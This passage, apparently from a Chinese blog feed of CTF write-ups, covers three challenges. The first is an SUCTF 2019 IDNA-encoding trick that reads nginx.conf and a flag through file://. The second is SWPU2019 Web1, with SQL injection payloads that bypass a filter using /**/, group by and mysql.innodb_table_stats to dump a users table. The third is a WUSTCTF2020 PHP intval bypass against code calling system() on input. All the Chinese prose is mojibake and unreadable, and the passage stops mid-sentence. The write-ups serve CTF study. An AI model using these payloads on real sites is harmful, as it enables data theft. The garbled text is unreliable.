<h1 id="å‰ç½®çŸ¥è¯†">å‰ç½®çŸ¥è¯†</h1>
<h2 id="ç›¸å…³å‡½æ•°é—®é¢˜">ç›¸å…³å‡½æ•°é—®é¢˜</h2>
<p>å‚è€ƒè¿æ¥ï¼š</p>
<ul>
<li>https://docs.python.org/zh-cn/3/library/urllib.parse.html</li>
<li><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">INDA</a></li>
</ul>
<p><code>urlparse(url)</code>ä½œç”¨ï¼šå°†urlå­—ç¬¦ä¸²åˆ†å‰²æˆå¤šä¸ªéƒ¨åˆ†ï¼Œä¸‹é¢æ˜¯å®˜ç½‘ç»™çš„ä¾‹å­ <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">&#x27;//www.cwi.nl:80/%7Eguido/Python.html&#x27;</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;&#x27;</span>, netloc=<span class="string">&#x27;www.cwi.nl:80&#x27;</span>, path=<span class="string">&#x27;/%7Eguido/Python.html&#x27;</span>,</span><br><span class="line">            params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">&#x27;www.cwi.nl/%7Eguido/Python.html&#x27;</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;&#x27;</span>, netloc=<span class="string">&#x27;&#x27;</span>, path=<span class="string">&#x27;www.cwi.nl/%7Eguido/Python.html&#x27;</span>,</span><br><span class="line">            params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">&#x27;help/Python.html&#x27;</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;&#x27;</span>, netloc=<span class="string">&#x27;&#x27;</span>, path=<span class="string">&#x27;help/Python.html&#x27;</span>, params=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>é™¤äº†è¿™äº›éƒ¨åˆ†ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€äº›å±æ€§ï¼ˆè¯¦ç»†çš„å¯ä»¥çœ‹å®˜ç½‘ï¼‰ï¼Œå…¶ä¸­å°±æœ‰<code>hostname</code>ã€‚ä¸ä¸¥è°¨çš„è§£é‡Šï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://abc.cde.com/index.php?name=hello&#x27;</span></span><br><span class="line"></span><br><span class="line">å…¶ä¸­hostnameå°±æ˜¯abc.cde.comï¼Œå³http://ä¹‹åï¼Œ/index.phpä¹‹å‰çš„éƒ¨åˆ†éƒ½æ˜¯</span><br></pre></td></tr></table></figure></p>
<p><code>urlsplit(url)</code>ä½œç”¨ï¼šå°†urlå­—ç¬¦ä¸²åˆ†å‰²æˆå¤šä¸ªéƒ¨åˆ†ï¼Œå¤§è‡´ä¸Šä¸<code>urlparse(url)</code>ä¸€æ ·ã€‚</p>
<p><code>urlunsplit(parts)</code>ä½œç”¨ï¼šä¸<code>urlsplit()</code>å‡½æ•°ç›¸åï¼Œè¿™æ˜¯å°†å¤šä¸ªéƒ¨åˆ†æ‹¼æ¥æˆä¸€ä¸ªurlã€‚</p>
<p><code>h.encode('idna')</code>ä½œç”¨ï¼šå°†hè¿›è¡Œindaç¼–ç ã€‚idnaç®€å•æ¥è¯´å°±æ˜¯ä¸ºäº†ç»Ÿä¸€ä¸åŒå›½å®¶è§çš„ç‰¹æ®Šå­—ç¬¦çš„åŸŸåè€Œè®¾è®¡å‡ºæ¥çš„ä¸€ç§ç¼–ç ï¼Œè¯´ç™½äº†å°±æ˜¯æŠŠå…¶ä»–è¯­è¨€åŠå…¶ç‰¹æ®Šå­—ç¬¦è½¬æ¢æˆè‹±æ–‡å³å›½é™…ç¬¦å·ã€‚</p>
<h2 id="ngnix">Ngnix</h2>
<p>ngnixçš„é…ç½®æ–‡ä»¶åœ°å€æ˜¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>/usr/localä¸‹çš„æ‰æ˜¯æ­£åœ¨ä½¿ç”¨çš„é…ç½®æ–‡ä»¶ï¼Œ/etc/nginxé‚£ä¸ªåªæ˜¯é»˜è®¤çš„é…ç½®</p>
</blockquote>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>åˆ†æä»£ç å¾—åˆ°æœ‰ç”¨çš„ä¿¡æ¯ï¼š - åˆ©ç”¨<code>return urllib.request.urlopen(finalUrl).read()</code>get flagï¼Œå› æ­¤ä½¿ç”¨ä¼ªåè®®fileè¯»å–ï¼› - æ ¹æ®æç¤ºï¼ŒåŸŸåä¸º<code>suctf.cc</code>ï¼Œä¸”è·Ÿngnixæœ‰å…³ç³»ã€‚æ‰€ä»¥ï¼Œå°è¯•å…ˆè¯»å–ngnixçš„é…ç½®æ–‡ä»¶<code>file://suctf.cc/usr/local/nginx/conf/nginx.conf</code>ï¼› - åŸŸåä¸èƒ½ç›´æ¥ä¸º<code>suctf.cc</code>ï¼Œç»è¿‡<code>h.encode('idna').decode('utf-8')</code>ä¹‹åæ‰ä¸º<code>suctf.cc</code>ã€‚è¿™æ ·æ‰å¯ä»¥ç»•è¿‡å‰ä¸¤ä¸ªifåˆ¤æ–­ï¼›</p>
<p>æ ¹æ®idnaç¼–ç è§„åˆ™ï¼Œå»<a href="https://www.compart.com/en/unicode">compart</a>ï¼Œæœç´¢ç›¸å…³çš„å­—ç¬¦ï¼Œåœ¨æœç´¢æ¡†è¾“å…¥<code>/</code>æ—¶æ‰¾åˆ°äº†</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416225726.png" /></p>
<p>å› æ­¤ï¼Œæ„é€ payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://suctf.câ„†sr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p>
<p>è§£é‡Šï¼šæ­¤æ—¶çš„hostnameä¸º<code>suctf.câ„†sr</code>ï¼Œä½†æ˜¯æ— æ³•è¢«è¢«è¯†åˆ«ï¼Œæ‰€ä»¥ä¸¤æ¬¡çš„<code>host=='suctf.cc'</code>éƒ½è¢«æˆåŠŸç»•è¿‡ã€‚è€Œå½“æ‰§è¡Œåˆ°<code>newhost.append(h.encode('idna').decode('utf-8'))</code>æ—¶ï¼Œ<code>câ„†sr</code>å˜æˆ<code>cc/usr</code>ï¼Œç„¶ååœ¨ç»è¿‡<code>parts[1] = '.'.join(newhost)</code>æ‹¼æ¥ï¼Œå¾—åˆ°<code>suctf.cc/usr</code>ï¼Œæœ€å<code>finalUrl = urlunsplit(parts).split(' ')[0]</code>å¾—åˆ°å®Œæˆçš„urlï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://suctf.cc/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416230456.png" /></p>
<p>æ‰¾åˆ°äº†flagæ–‡ä»¶çš„ä½ç½®ï¼Œæ¥ä¸‹æ¥æ„é€ å¦‚ä¸‹payloadï¼Œæœ€ç»ˆå¾—åˆ°flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://suctf.câ„†sr/fffffflag</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416230602.png" /></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>æˆ‘è®¤ä¸ºæœ¬é¢˜è€ƒå¯Ÿçš„<code>idna</code>ç¼–ç ç¡®å®æ¯”è¾ƒå°‘è§ï¼Œæˆ‘ä¸ªäººåˆ†æä»£ç å¾—åˆ°äº†éœ€è¦åˆ©ç”¨æŸç§ç¼–ç æ–¹å¼ç»•è¿‡å‰ä¸¤æ¬¡ifï¼Œç„¶åç»è¿‡<code>idna</code>ç¼–ç å†å¾—åˆ°æ­£ç¡®çš„åŸŸåï¼Œä½†æ˜¯æ‰¾ä¸åˆ°å¯ç”¨çš„å­—ç¬¦ï¼Œç»è¿‡æŸ¥çœ‹å¤§ä½¬çš„writeupä¹‹åæ‰æ‰¾åˆ°ã€‚</p>
<p>å¤§ä½¬writeup</p>
<ul>
<li>https://mashiro01.github.io/writeup/SUCTF_2019.html</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>IDNAç¼–ç </tag>
      </tags>
  </entry>
  <entry>
    <title>SWPU2019 Web1</title>
    <url>/2022/04/13/SWPU2019%20Web1/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb1">Web1</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒå‘ç°äº†ç™»å½•ç•Œé¢å’Œæ³¨å†Œç•Œé¢ã€‚åœ¨ç™»å½•ç•Œé¢æµ‹è¯•äº†å¼±å£ä»¤ã€sqlæ³¨å…¥æ— æœåå°è¯•å…ˆæ³¨å†Œï¼Œç„¶åçœ‹ä¸€ä¸‹ç™»å½•ä¹‹åçš„åŠŸèƒ½ç‚¹ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103012.png" /></p>
<p>å‘ç°å­˜åœ¨ä¸€ä¸ª<code>ç”³è¯·å‘å¸ƒå¹¿å‘Š</code>çš„åŠŸèƒ½ç‚¹ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103037.png" /></p>
<p>è¿›å…¥ä¹‹åå‘ç°æœ‰ä¸¤ä¸ªè¾“å…¥æ¡†ã€‚æˆ‘é¦–å…ˆæµ‹è¯•äº†ä¸€ä¸‹XSSæ¼æ´ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103206.png" /></p>
<p>å‘ç°ç¡®å®å­˜åœ¨XSSæ¼æ´ã€‚ä½†æ˜¯è¯¥æ¼æ´å¯¹æˆ‘ä»¬è·å–flagæ²¡æœ‰ä½œç”¨ï¼Œè¯¥æ¼æ´çš„æœ€å¤§ä½œç”¨æ˜¯è·å–cookieã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103228.png" /></p>
<p>å› æ­¤ï¼Œç»§ç»­æµ‹è¯•æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥æ¼æ´ã€‚å‘ç°<code>å¹¿å‘Šå</code>å¤„å­˜åœ¨ç€sqlæ³¨å…¥æ¼æ´ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103358.png" /></p>
<p>åæ¥ç»è¿‡æµ‹è¯•ï¼Œå‘ç°è¿‡æ»¤äº†ç©ºæ ¼ã€åå¼•å·ã€<code>-</code>ã€<code>#</code>ã€<code>or</code>ã€<code>and</code>ç­‰ã€‚å¹¶ä¸”æ²¡æ³•ç”¨å¤§å°å†™ç­‰æ–¹å¼ç»•è¿‡ã€‚</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>ç©ºæ ¼æ¯”è¾ƒç®€ç­”ï¼Œå¯ä»¥åˆ©ç”¨<code>/**/</code>ç»•è¿‡ï¼›è¿‡æ»¤äº†æ³¨é‡Šç¬¦ï¼Œå¯ä»¥åˆ©ç”¨å•å¼•å·é—­åˆåé¢çš„ç»•è¿‡ï¼Œæ¯”å¦‚<code>-1' union select 1,2,3,'4</code>ã€‚ä½†æ˜¯<code>or</code>å°±æ¯”è¾ƒéš¾åŠäº†ï¼Œå› ä¸º<code>order by</code>å’Œ<code>information_schema</code>éƒ½åŒ…å«<code>or</code>ã€‚å› æ­¤è¿™é‡Œæ¶‰åŠåˆ°äº†ä¸¤ä¸ªæŠ€å·§ï¼š</p>
<ul>
<li>Bypass information_schema;</li>
<li>æ— åˆ—åæ³¨å…¥</li>
</ul>
<p>[[information_schemaç»•è¿‡åŠæ— åˆ—åæ³¨å…¥]]</p>
<p>é¦–å…ˆï¼Œå…ˆæŸ¥è¯¢å­—æ®µæ•°ï¼ˆ<code>ordey by</code>å¯ä»¥ç”¨<code>group by</code>ä»£æ›¿ï¼Œåè€…å¯ä»¥å¯¹ç»“æœè¿›è¡Œåˆ†ç»„ï¼Œä½†æ˜¯ä¸åˆ†ç»„çš„è¯å°±æ˜¯ç®€å•çš„æ˜¾ç¤ºäº†ï¼‰ï¼Œæœ¬é¢˜å­—æ®µæ•°ç‰¹åˆ«é•¿ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/group/**/by/**/23,&#x27;1</span><br><span class="line">-1&#x27;/**/group/**/by/**/22,&#x27;1</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104032.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104049.png" /></p>
<p>å‘ç°å‰è€…æŠ¥é”™ï¼Œè€Œåè€…é¡µé¢æ­£å¸¸ã€‚å› æ­¤ï¼Œå­—æ®µæ•°ä¸º22ã€‚</p>
<p>æ¥ç€ï¼ŒæŸ¥è¯¢æ•°æ®åº“åï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104418.png" /></p>
<p>ç„¶åä½¿ç”¨<code>mysql.innodb_table_stats</code>ä»£æ›¿<code>information_schema</code>æ¥æŸ¥è¯¢è¡¨åï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104608.png" /></p>
<p>ï¼ˆflagåœ¨<code>users</code>ä¸­ï¼‰</p>
<p>æ¥ç€åˆ©ç”¨<strong>æ— åˆ—åæ³¨å…¥</strong>è·å¾—åˆ—åï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,(select/**/group_concat(c)/**/from(select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¿™é‡Œçš„å­—æ®µæ•°ï¼ˆ<code>select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users</code>ï¼‰ä¸å¯¹ï¼Œä¼šæŠ¥é”™ï¼ˆå¦‚ä¸‹å›¾ï¼‰ ï¼Œå¦‚æœå­—æ®µæ•°æ­£ç¡®ï¼Œåˆ™ä¼šç›´æ¥æ˜¾ç¤ºå¯¹åº”çš„å†…å®¹ã€‚å› ä¸ºåå¼•å·è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥é€šè¿‡å–åˆ«åçš„æ–¹å¼ç»•è¿‡ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111135.png" /></p>
<p>æœ€ç»ˆå¾—åˆ°flagï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111200.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>æ— åˆ—åæ³¨å…¥</tag>
        <tag>Bypass information_schema</tag>
      </tags>
  </entry>
  <entry>
    <title>WUSTCTF2020 æœ´å®æ— å</title>
    <url>/2022/04/07/WUSTCTF2020%20%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BWUSTCTF2020%5Dæœ´å®æ— å">æœ´å®æ— å</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒä¹‹ååªæœ‰ä¸¤è¡Œå†…å®¹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hack me  </span><br><span class="line">Warning: Cannot modify header information - headers already sent by (output started at /var/www/html/index.php:3) in /var/www/html/index.php on line 4</span><br></pre></td></tr></table></figure></p>
<p>æŒ‰ç…§ç®¡ç†ï¼Œå…ˆçœ‹ä¸€ä¸‹<code>robots.txt</code>ï¼Œç„¶åæŸ¥çœ‹æºç ï¼ŒæŠ“åŒ…ã€‚</p>
<p>æŸ¥çœ‹<code>robots.txt</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407131400.png" /></p>
<p>è®¿é—®è¯¥æ–‡ä»¶ï¼Œå¾—åˆ° <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;this_is_not_flag&#125;</span><br></pre></td></tr></table></figure></p>
<p>è¿™ä¸€å®šä¸æ˜¯flagã€‚ç„¶åå†çœ‹ä¸€ä¸‹è¯·æ±‚è¿™ä¸ªæ–‡ä»¶çš„æ•°æ®åŒ…</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407131559.png" /></p>
<p>å‘ç°äº†çº¢æ¡†ä¸­çš„å†…å®¹ã€‚ç›´æ¥è®¿é—®è¯¥æ–‡ä»¶ï¼ˆå¦‚æœå‡ºç°ä¹±ç ï¼Œæ”¹ä¸€ä¸‹é¡µé¢çš„ç¼–ç å³å¯ã€‚ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407131717.png" /></p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>å°†ä»£ç å¤åˆ¶ï¼Œæ•´ç†å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//levelÂ 1  </span></span><br><span class="line"><span class="keyword">if</span>Â (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123; <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(intval(<span class="variable">$num</span>)Â &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>)Â &gt; <span class="number">2021</span>)&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span> <span class="string">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«,Â ä¸æ˜¯æƒ³çœ‹æ—¶é—´,Â åªæ˜¯æƒ³ä¸ç»æ„é—´,Â è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;  </span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â <span class="keyword">else</span>&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;</span>);  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">//levelÂ 2  </span></span><br><span class="line"><span class="keyword">if</span>Â (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123; </span><br><span class="line">	<span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];  </span><br><span class="line">	<span class="keyword">if</span>Â (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))  </span><br><span class="line">Â Â Â Â Â Â Â <span class="keyword">echo</span> <span class="string">&quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå,Â æ„Ÿæ¿€æ¶•é›¶,Â è·‘å»ä¸œæ¾œå²¸,Â æ‰¾ä¸€å®¶é¤å…,Â æŠŠå¨å¸ˆè½°å‡ºå»,Â è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ,Â å€’ä¸€æ¯æ•£è£…ç™½é…’,Â è‡´å¯Œæœ‰é“,Â åˆ«å­¦å°æš´.&lt;/br&gt;&quot;</span>;  </span><br><span class="line">Â Â Â Â <span class="keyword">else</span>  </span><br><span class="line">	Â Â Â <span class="keyword">die</span>(<span class="string">&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹,Â ä»–æ‰“äº†ä¸ªç”µè¯,Â æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;</span>);  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//getÂ flag  </span></span><br><span class="line"><span class="keyword">if</span>Â (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123; <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot;Â &quot;</span>))&#123; <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span> <span class="string">&quot;æƒ³åˆ°è¿™é‡Œ,Â æˆ‘å……å®è€Œæ¬£æ…°,Â æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å,Â ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;</span>; system(<span class="variable">$get_flag</span>);  </span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â <span class="keyword">else</span>&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;å¿«åˆ°éæ´²äº†&quot;</span>);  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>è¿™é‡Œæœ‰3ä¸ªifè¯­å¥ï¼Œåªæœ‰æœ€åä¸€ä¸ªæ‰èƒ½è¾“å‡ºflagã€‚ä½†æ˜¯ï¼Œå¦‚æœä¸æ»¡è¶³å‰é¢2ä¸ªifè¯­å¥ï¼Œå°±ä¼šå› ä¸º<code>die</code>ï¼Œè€Œç›´æ¥é€€å‡ºç¨‹åºã€‚å› æ­¤ï¼Œè¦åŒæ—¶æ»¡è¶³3ä¸ªifæ‰å¯ä»¥å¾—åˆ°flagã€‚</p>
<h2 id="intvalå‡½æ•°ç»•è¿‡">intvalå‡½æ•°ç»•è¿‡</h2>
<p>éœ€è¦ä»¥GETæ–¹å¼ä¼ å…¥ä¸€ä¸ªå‚æ•°<code>num</code>ï¼Œå¹¶ä¸”è¦æ»¡è¶³ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">intval(<span class="variable">$num</span>)Â &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>)Â &gt; <span class="number">2021</span></span><br></pre></td></tr></table></figure></p>
<p><code>intval</code>å‡½æ•°çš„ä½œç”¨æ˜¯å–è¯¥æ•°å­—çš„æ•´æ•°éƒ¨åˆ†ã€‚ä¹Ÿå°±æ˜¯ä¸€ä¸ªæ•°çš„æ•´æ•°éƒ¨åˆ†è¦å°äº2020ï¼Œä½†æ˜¯åŠ 1ä¹‹åè¦å¤§äº2021ï¼Œè¿™é‡Œé¢çš„è·¨åº¦å¤§äº1ï¼Œå› æ­¤æ­£å¸¸çš„ä¸€ä¸ªæ•°å­—æ˜¯ä¸å¯èƒ½å®ç°çš„ï¼Œå› æ­¤ä¸€å®šå­˜åœ¨æŸç§ç»•è¿‡æ–¹æ³•ã€‚</p>
<p>é€šè¿‡æœç´ ï¼Œå¾—åˆ°ä¸‹é¢ç»“æœ<a href="https://www.runoob.com/php/php-intval-function.html">intval</a>ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>); <span class="comment">// 42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">4.2</span>); <span class="comment">// 4 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;42&#x27;</span>); <span class="comment">// 42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;+42&#x27;</span>); <span class="comment">// 42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;-42&#x27;</span>); <span class="comment">// -42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">042</span>); <span class="comment">// 34 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;042&#x27;</span>); <span class="comment">// 42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">1e10</span>); <span class="comment">// 10000000000</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;1e10&#x27;</span>); <span class="comment">// 1 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">0x1A</span>); <span class="comment">// 26 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42000000</span>); <span class="comment">// 42000000 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">420000000000000000000</span>); <span class="comment">// 0 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;420000000000000000000&#x27;</span>); <span class="comment">// 2147483647ï¼Œ32ä½osæœ€å¤§æ•´æ•°å€¼</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>, <span class="number">8</span>); <span class="comment">// 42 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;42&#x27;</span>, <span class="number">8</span>); <span class="comment">// 34 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>()); <span class="comment">// 0 </span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>)); <span class="comment">// 1 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯<code>intval(1e10)</code>å’Œ<code>intval('1e10')</code>ï¼Œå‰è€…è¢«å½“ä½œæ•°å­—ï¼Œå› æ­¤ç»“æœä¸º10çš„10æ¬¡æ–¹ï¼Œè€Œåè€…è¢«å½“ä½œå­—ç¬¦ä¸²ï¼Œå› æ­¤å–æœ€å‰é¢çš„æœ‰æ•ˆæ•°å­—ï¼Œç»“æœä½1ã€‚</p>
<p>ä½†æ˜¯ï¼Œå¦‚æœæ˜¯<code>'1e10'+1</code>å‘¢ï¼Ÿ</p>
